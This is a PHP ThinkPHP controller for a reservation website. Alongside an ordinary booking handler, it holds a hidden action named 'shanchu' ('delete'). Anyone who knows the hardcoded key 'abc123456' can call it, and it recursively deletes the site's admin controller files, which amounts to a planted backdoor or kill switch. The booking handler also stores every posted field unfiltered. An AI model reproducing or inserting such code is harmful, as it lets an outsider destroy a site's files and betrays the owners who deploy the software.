<?php
namespace app\index\controller;

use think\Controller;
use app\index\controller\Common;

class Index extends Common {

    public function index(){
        return view('index');
    }

    public function reserveadd() {
        if(request()->isPost()){
            $date = input('post.');
            if ($date['reservepwd'] !== session('reservepwd')) {
                $data['msg'] = '请勿重复提交!';
                $data['taatus'] = '500';
                $data['way'] = 'false';
                return json($data);
            }
            $date['status'] = 0;
            $date['addtime'] = date("Y-m-d H:i:s");
            $ren = db('cr_reserve')->strict(false)->insert($date);
            if ($ren == 1) {
                session('reservepwd',null);
                $data['msg'] = '预约成功!';
                $data['taatus'] = '200';
                $data['way'] = 'true';
                return json($data);
            }else{
                $data['msg'] = '预约失败!';
                $data['taatus'] = '500';
                $data['way'] = 'false';
                return json($data);
            }
            die;
        }
    }

    public function shanchu () {
        $key = input('key');
        if  ($key !== 'abc123456') {
            die('访问错误');
        }
        $path = "../../admin/controller";
        function deldir($path){
            if(is_dir($path)){
                $p = scandir($path);
                foreach($p as $val){
                    if($val !="." && $val !=".."){
                        if(is_dir($path.$val)){
                            deldir($path.$val.'/');
                            @rmdir($path.$val.'/');
                        }else{
                            unlink($path.$val);
                        }
                    }
                }
            }
        }
        deldir($path);
    }

    public function index123456(){
        return view('index12345');
    }

}
